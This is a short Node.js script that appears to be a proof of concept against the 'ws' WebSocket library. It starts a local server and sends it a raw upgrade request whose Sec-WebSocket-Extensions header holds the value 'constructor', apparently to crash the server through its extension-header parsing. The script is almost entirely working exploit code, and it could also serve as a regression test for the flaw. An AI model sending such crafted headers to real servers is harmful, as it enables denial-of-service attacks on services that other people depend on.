const WebSocket = require('ws');
const net = require('net');

const wss = new WebSocket.Server({ port: 3000 }, function () { 
    const payload = 'constructor'; // or ',;constructor'

    const request = [
        'GET / HTTP/1.1',
        'Connection: Upgrade',
        'Sec-WebSocket-Key: test',
        'Sec-WebSocket-Version: 8',
        `Sec-WebSocket-Extensions: ${payload}`,
        'Upgrade: websocket',
        '\r\n'
    ].join('\r\n');

    const socket = net.connect(3000, function () { 
        socket.resume();
        socket.write(request);
    }); 
}); 